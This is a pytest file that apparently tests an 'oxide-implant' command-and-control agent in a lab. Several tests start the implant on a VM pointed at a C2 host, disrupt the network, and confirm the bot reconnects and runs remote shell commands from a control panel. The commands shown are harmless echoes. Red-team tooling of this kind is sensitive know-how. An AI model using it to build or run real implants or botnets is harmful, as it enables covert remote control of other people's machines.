"""Network interruption and reconnection tests."""

import asyncio
import time
import pytest

from .helpers.wait_conditions import wait_for_bot_online, wait_for_bot_status, wait_for_bot_count


@pytest.mark.asyncio
async def test_reconnect_after_interface_down(
    panel_client, target_vm_1, vm_manager, network_interruption
):
    """Implant reconnects after network interface goes down and up."""
    # Start implant
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Bring interface down
    network_interruption.interface_down(target_vm_1)

    # Wait for bot to show offline
    await wait_for_bot_status(panel_client, hwid, "offline", timeout=90)

    # Bring interface back up
    network_interruption.interface_up(target_vm_1)

    # Wait for reconnect
    await wait_for_bot_online(panel_client, hwid, timeout=90)

    # Verify functionality
    from .helpers.wait_conditions import wait_for_response
    result = await panel_client.send_command(hwid, "shell", {"command": "echo reconnected"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)
    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_reconnect_with_backoff_timing(
    panel_client, target_vm_1, vm_manager, network_interruption
):
    """Verify reconnection respects backoff timing (not too fast, not too slow)."""
    # Start implant
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Bring interface down
    network_interruption.interface_down(target_vm_1)
    await wait_for_bot_status(panel_client, hwid, "offline", timeout=90)

    # Record time when we bring interface back up
    network_interruption.interface_up(target_vm_1)
    restore_time = time.time()

    # Wait for reconnect
    await wait_for_bot_online(panel_client, hwid, timeout=90)
    reconnect_time = time.time()

    # Calculate reconnect duration
    duration = reconnect_time - restore_time

    # Backoff should respect RECONNECT_MAX (60s) but also shouldn't be instant
    # First reconnect attempt is after RECONNECT_BASE (1s) + jitter
    # Allow some margin for network latency
    assert duration < 70, f"Reconnect took too long: {duration}s (max should be ~60s)"
    # Should take at least a small amount of time (not instant)
    assert duration >= 0.5, f"Reconnect was suspiciously fast: {duration}s"


@pytest.mark.asyncio
async def test_multiple_disconnects(
    panel_client, target_vm_1, vm_manager, network_interruption
):
    """Implant handles multiple disconnect/reconnect cycles."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Perform 3 disconnect/reconnect cycles
    for i in range(3):
        # Disconnect
        network_interruption.interface_down(target_vm_1)
        await wait_for_bot_status(panel_client, hwid, "offline", timeout=90)

        # Short delay
        await asyncio.sleep(2)

        # Reconnect
        network_interruption.interface_up(target_vm_1)
        await wait_for_bot_online(panel_client, hwid, timeout=90)

    # Verify still functional after multiple cycles
    from .helpers.wait_conditions import wait_for_response
    result = await panel_client.send_command(hwid, "shell", {"command": "echo stable"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)
    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_packet_loss_recovery(
    panel_client, target_vm_1, vm_manager, network_interruption
):
    """Implant recovers from high packet loss conditions."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Introduce 50% packet loss
    network_interruption.add_packet_loss(target_vm_1, percent=50)

    # Commands may fail or timeout under packet loss
    # Just verify implant doesn't crash
    await asyncio.sleep(10)

    # Remove packet loss
    network_interruption.remove_packet_loss(target_vm_1)

    # Wait for stable connection
    await asyncio.sleep(5)

    # Verify recovery
    from .helpers.wait_conditions import wait_for_response
    result = await panel_client.send_command(hwid, "shell", {"command": "echo recovered"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)
    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_latency_spike_handling(
    panel_client, target_vm_1, vm_manager, network_interruption
):
    """Implant handles high latency conditions."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Add 500ms latency
    network_interruption.add_latency(target_vm_1, delay_ms=500)

    # Commands should still work, just slower
    from .helpers.wait_conditions import wait_for_response
    result = await panel_client.send_command(hwid, "shell", {"command": "echo slow"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=60)
    assert response["status"] == "success"

    # Remove latency
    network_interruption.remove_latency(target_vm_1)
